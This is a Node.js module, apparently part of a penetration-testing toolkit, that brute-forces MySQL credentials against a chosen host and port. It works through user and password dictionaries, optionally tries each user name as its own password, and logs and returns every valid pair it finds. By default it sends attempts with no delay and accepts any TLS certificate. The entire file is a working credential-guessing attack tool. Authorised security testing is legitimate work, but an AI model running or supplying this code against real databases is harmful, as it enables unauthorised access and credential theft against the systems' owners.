/*
    Copyright Sergio García <s3rgio.gr gmail com>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

'use strict';


// Private stuff

var mysql = require('mysql'),
    async = require('async'),

    logger = require('../utils/logger'),

    HELP = {
        description: 'MYSQL credentials brute force',
        options: {
            target: {
                type: 'ip',
                description: 'Host to attack',
                defaultValue: '127.0.0.1'
            },
            port: {
                type: 'port',
                description: 'Port to attack on chosen IPs',
                defaultValue: 3306
            },
            users: {
                type: 'userPass',
                description: 'Users, range (ie: range:0000-0100) or file with them to test',
                defaultValue: 'file:artifacts/dics/john.txt'
            },
            passwords: {
                type: 'userPass',
                description: 'Password (or file with them) to test',
                defaultValue: 'file:artifacts/dics/john.txt'
            },
            userAsPass: {
                type: 'yesNo',
                description: 'Test the same user as password for each one.',
                defaultValue: 'yes'
            },
            delay: {
                type: 'positiveInt',
                description: 'Delay between requests, in ms.',
                defaultValue: 0
            },
            timeout: {
                type: 'positiveInt',
                description: 'Time to wait for a response, in ms.',
                defaultValue: 5000
            }
        }
    };


// Public stuff

module.exports.help = HELP;

module.exports.run = function (options, callback) {
    var result = [],
        indexCountUsr = 0, // Used with delay to know in which index we are
        indexCountPass = 0;

    // We avoid to parallelize here to control the interval of the requests
    async.eachSeries(options.users, function (user, asyncCbUsr) {
        var finalPasswords = [];

        finalPasswords = finalPasswords.concat(options.passwords);
        indexCountUsr += 1;
        indexCountPass = 0;
        if (options.userAsPass) {
            finalPasswords.push(user);
        }

        async.eachSeries(finalPasswords, function (password, asyncCbPass) {
            var config = {
                    host: options.target,
                    port: options.port,
                    user: user,
                    password: password,
                    connectTimeout: options.timeout
                },
                conn;

            function delayCb() {
                // Last element
                if (indexCountPass === finalPasswords.length &&
                    indexCountUsr === options.users.length) {
                    asyncCbPass();
                } else {
                    setTimeout(asyncCbPass, options.delay);
                }
            }

            // Just in case
            config.ssl = { rejectUnauthorized: false };
            conn = mysql.createConnection(config);
            indexCountPass += 1;
            conn.connect(function (err) {
                conn.destroy();
                if (err) {
                    if (/ER_ACCESS_DENIED_ERROR/.test(err)) {
                        logger.infoHigh('Valid credentials NOT found for: ' +
                                         user + ' | ' + password);
                        delayCb();
                    } else {
                        asyncCbPass(err);
                    }
                } else {
                    result.push({
                        user: user,
                        pass: password
                    });
                    logger.highlight('Valid credentials found: ' + user +
                                      ' | ' + password);
                    delayCb();
                }
            });
        }, function (err) {
            asyncCbUsr(err);
        });
    }, function (err) {
        callback(err, result);
    });
};
